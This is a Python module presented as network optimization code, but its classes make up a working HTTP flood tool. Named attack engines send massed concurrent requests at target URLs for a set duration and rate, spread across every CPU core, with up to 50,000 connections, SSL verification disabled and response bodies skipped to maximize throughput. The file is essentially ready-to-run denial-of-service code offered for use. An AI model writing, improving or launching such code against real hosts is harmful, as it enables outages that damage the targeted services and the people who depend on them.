"""
High Performance Network Optimization Module
Optimized for 10 Gbps networks and multi-core processors
"""

import asyncio
import aiohttp
import socket
import threading
import multiprocessing
import concurrent.futures
import queue
import time
import psutil
import gc
from typing import List, Dict, Any, Optional, Callable
import uvloop  # High-performance event loop
import httpx  # High-performance HTTP client


class HighPerformanceNetworkManager:
    """
    Advanced network manager optimized for 10 Gbps networks
    """
    
    def __init__(self, config: Dict[str, Any]):
        self.config = config
        self.cpu_count = psutil.cpu_count()
        self.memory_info = psutil.virtual_memory()
        
        # Network optimization settings
        self.socket_options = {
            socket.SO_REUSEADDR: 1,
            socket.SO_REUSEPORT: 1,
            socket.TCP_NODELAY: 1,
            socket.SO_KEEPALIVE: 1,
            socket.SO_RCVBUF: config.get('socket_buffer_size', 8388608),
            socket.SO_SNDBUF: config.get('socket_buffer_size', 8388608),
        }
        
        # Connection pools
        self.connection_pools = {}
        self.session_pools = {}
        
        # Performance counters
        self.stats = {
            'requests_sent': 0,
            'bytes_sent': 0,
            'connections_created': 0,
            'errors': 0,
            'start_time': time.time()
        }
        
    def optimize_system_settings(self):
        """
        Optimize system-level network settings for maximum performance
        """
        try:
            # Set process priority to high
            import os
            if os.name == 'nt':  # Windows
                import psutil
                p = psutil.Process()
                p.nice(psutil.HIGH_PRIORITY_CLASS)
            else:  # Linux/Unix
                os.nice(-10)
                
            # Optimize garbage collection
            gc.set_threshold(700, 10, 10)
            
            # Set thread stack size
            threading.stack_size(1048576)  # 1MB stack size
            
        except Exception as e:
            print(f"Warning: Could not optimize system settings: {e}")
    
    def create_optimized_socket(self, family=socket.AF_INET, type=socket.SOCK_STREAM):
        """
        Create a socket with optimized settings for high-speed networks
        """
        sock = socket.socket(family, type)
        
        # Apply socket options
        for option, value in self.socket_options.items():
            try:
                sock.setsockopt(socket.SOL_SOCKET, option, value)
            except OSError:
                pass  # Some options may not be available on all systems
                
        # Set non-blocking mode
        sock.setblocking(False)
        
        return sock
    
    async def create_aiohttp_session(self, connector_limit: int = 5000):
        """
        Create optimized aiohttp session for async operations
        """
        connector = aiohttp.TCPConnector(
            limit=connector_limit,
            limit_per_host=1000,
            ttl_dns_cache=300,
            use_dns_cache=True,
            keepalive_timeout=30,
            enable_cleanup_closed=True,
            force_close=False,
            auto_decompress=False,  # Disable compression for speed
        )
        
        timeout = aiohttp.ClientTimeout(
            total=self.config.get('timeout', 2),
            connect=self.config.get('connect_timeout', 1),
            sock_read=self.config.get('read_timeout', 3),
            sock_connect=self.config.get('connect_timeout', 1)
        )
        
        session = aiohttp.ClientSession(
            connector=connector,
            timeout=timeout,
            skip_auto_headers=['User-Agent'],
            raise_for_status=False,
            auto_decompress=False
        )
        
        return session
    
    def create_httpx_client(self):
        """
        Create optimized HTTPX client for sync operations
        """
        limits = httpx.Limits(
            max_keepalive_connections=self.config.get('connection_pool_size', 5000),
            max_connections=self.config.get('max_concurrent_connections', 50000),
            keepalive_expiry=30.0
        )
        
        timeout = httpx.Timeout(
            connect=self.config.get('connect_timeout', 1),
            read=self.config.get('read_timeout', 3),
            write=self.config.get('write_timeout', 3),
            pool=5.0
        )
        
        client = httpx.Client(
            limits=limits,
            timeout=timeout,
            verify=False,  # Disable SSL verification for speed
            http2=True,  # Enable HTTP/2 for better performance
            follow_redirects=False
        )
        
        return client


class AsyncAttackEngine:
    """
    High-performance async attack engine using uvloop and aiohttp
    """
    
    def __init__(self, config: Dict[str, Any]):
        self.config = config
        self.network_manager = HighPerformanceNetworkManager(config)
        self.semaphore = None
        self.session = None
        self.stats = {
            'requests_sent': 0,
            'successful_requests': 0,
            'failed_requests': 0,
            'bytes_sent': 0,
            'start_time': 0,
            'end_time': 0
        }
        
    async def initialize(self):
        """
        Initialize the async engine with optimized settings
        """
        # Set uvloop as the event loop policy for better performance
        try:
            asyncio.set_event_loop_policy(uvloop.EventLoopPolicy())
        except ImportError:
            pass  # uvloop not available, use default event loop
            
        # Create semaphore to limit concurrent connections
        max_concurrent = self.config.get('max_concurrent_connections', 50000)
        self.semaphore = asyncio.Semaphore(max_concurrent)
        
        # Create optimized session
        self.session = await self.network_manager.create_aiohttp_session()
        
        # Optimize system settings
        self.network_manager.optimize_system_settings()
        
    async def send_request(self, url: str, method: str = 'GET', headers: Dict = None, data: Any = None):
        """
        Send a single optimized HTTP request
        """
        async with self.semaphore:
            try:
                async with self.session.request(
                    method=method,
                    url=url,
                    headers=headers,
                    data=data,
                    allow_redirects=False,
                    compress=False
                ) as response:
                    self.stats['requests_sent'] += 1
                    if response.status < 400:
                        self.stats['successful_requests'] += 1
                    else:
                        self.stats['failed_requests'] += 1
                    
                    # Don't read response body for performance
                    return response.status
                    
            except Exception as e:
                self.stats['failed_requests'] += 1
                return None
    
    async def batch_attack(self, targets: List[str], duration: int, requests_per_second: int):
        """
        Execute high-performance batch attack
        """
        self.stats['start_time'] = time.time()
        end_time = self.stats['start_time'] + duration
        
        # Calculate delay between requests
        delay = 1.0 / requests_per_second if requests_per_second > 0 else 0
        
        tasks = []
        request_count = 0
        
        while time.time() < end_time:
            for target in targets:
                if time.time() >= end_time:
                    break
                    
                # Create request task
                task = asyncio.create_task(self.send_request(target))
                tasks.append(task)
                request_count += 1
                
                # Batch processing to avoid memory issues
                if len(tasks) >= self.config.get('batch_size', 1000):
                    await asyncio.gather(*tasks, return_exceptions=True)
                    tasks.clear()
                
                # Rate limiting
                if delay > 0:
                    await asyncio.sleep(delay)
        
        # Process remaining tasks
        if tasks:
            await asyncio.gather(*tasks, return_exceptions=True)
        
        self.stats['end_time'] = time.time()
        
    async def cleanup(self):
        """
        Clean up resources
        """
        if self.session:
            await self.session.close()


class MultiProcessAttackManager:
    """
    Multi-process attack manager for maximum CPU utilization
    """
    
    def __init__(self, config: Dict[str, Any]):
        self.config = config
        self.cpu_count = psutil.cpu_count()
        self.process_pool = None
        self.stats_queue = multiprocessing.Queue()
        
    def create_process_pool(self):
        """
        Create optimized process pool
        """
        # Use all available CPU cores
        max_workers = self.config.get('cpu_cores', self.cpu_count)
        
        self.process_pool = concurrent.futures.ProcessPoolExecutor(
            max_workers=max_workers,
            mp_context=multiprocessing.get_context('spawn')
        )
        
    def execute_distributed_attack(self, targets: List[str], duration: int, total_rps: int):
        """
        Execute attack distributed across multiple processes
        """
        if not self.process_pool:
            self.create_process_pool()
        
        # Distribute load across processes
        rps_per_process = total_rps // self.cpu_count
        
        futures = []
        for i in range(self.cpu_count):
            future = self.process_pool.submit(
                self._process_worker,
                targets,
                duration,
                rps_per_process,
                i
            )
            futures.append(future)
        
        # Wait for all processes to complete
        results = []
        for future in concurrent.futures.as_completed(futures):
            try:
                result = future.result()
                results.append(result)
            except Exception as e:
                print(f"Process error: {e}")
        
        return results
    
    def _process_worker(self, targets: List[str], duration: int, rps: int, process_id: int):
        """
        Worker function for individual process
        """
        # Create new event loop for this process
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        
        try:
            # Create async engine for this process
            engine = AsyncAttackEngine(self.config)
            
            # Run the attack
            loop.run_until_complete(engine.initialize())
            loop.run_until_complete(engine.batch_attack(targets, duration, rps))
            loop.run_until_complete(engine.cleanup())
            
            return engine.stats
            
        finally:
            loop.close()
    
    def cleanup(self):
        """
        Clean up process pool
        """
        if self.process_pool:
            self.process_pool.shutdown(wait=True)


class PerformanceMonitor:
    """
    Real-time performance monitoring for high-speed attacks
    """
    
    def __init__(self):
        self.start_time = 0
        self.stats = {}
        self.monitoring = False
        
    def start_monitoring(self):
        """
        Start performance monitoring
        """
        self.start_time = time.time()
        self.monitoring = True
        
        # Start monitoring thread
        monitor_thread = threading.Thread(target=self._monitor_loop, daemon=True)
        monitor_thread.start()
        
    def _monitor_loop(self):
        """
        Monitoring loop
        """
        while self.monitoring:
            # Collect system stats
            cpu_percent = psutil.cpu_percent(interval=1)
            memory = psutil.virtual_memory()
            network = psutil.net_io_counters()
            
            self.stats = {
                'timestamp': time.time(),
                'cpu_percent': cpu_percent,
                'memory_percent': memory.percent,
                'memory_available': memory.available,
                'network_bytes_sent': network.bytes_sent,
                'network_bytes_recv': network.bytes_recv,
                'network_packets_sent': network.packets_sent,
                'network_packets_recv': network.packets_recv
            }
            
            time.sleep(1)
    
    def get_performance_summary(self):
        """
        Get performance summary
        """
        runtime = time.time() - self.start_time
        
        return {
            'runtime_seconds': runtime,
            'current_stats': self.stats,
            'cpu_cores': psutil.cpu_count(),
            'total_memory': psutil.virtual_memory().total
        }
    
    def stop_monitoring(self):
        """
        Stop monitoring
        """
        self.monitoring = False


# High-performance utility functions
def optimize_tcp_socket(sock):
    """
    Apply TCP optimizations to a socket
    """
    try:
        # Disable Nagle's algorithm
        sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        
        # Enable TCP keep-alive
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
        
        # Set large buffers
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 8388608)  # 8MB
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 8388608)  # 8MB
        
        # Enable socket reuse
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        
    except OSError as e:
        pass  # Some options may not be available


def calculate_optimal_concurrency(target_rps: int, network_speed_gbps: int = 10):
    """
    Calculate optimal concurrency based on network speed and target RPS
    """
    # Estimate based on network capacity
    max_theoretical_rps = network_speed_gbps * 1000000  # Convert to Mbps then estimate
    
    # Conservative estimate: 1 request per 1KB at 10 Gbps = ~1.25M RPS theoretical max
    estimated_max_rps = network_speed_gbps * 125000
    
    # Calculate optimal concurrency
    if target_rps > estimated_max_rps:
        target_rps = estimated_max_rps
    
    # Rule of thumb: concurrency = target_rps / 100 (assuming 100 RPS per connection)
    optimal_concurrency = max(target_rps // 100, 1000)
    
    # Cap at system limits
    max_concurrency = min(optimal_concurrency, 65535)  # Max port range
    
    return max_concurrency


def get_system_limits():
    """
    Get system resource limits
    """
    return {
        'cpu_cores': psutil.cpu_count(),
        'total_memory': psutil.virtual_memory().total,
        'available_memory': psutil.virtual_memory().available,
        'max_open_files': 65535,  # Typical limit
        'network_interfaces': len(psutil.net_if_addrs()),
    }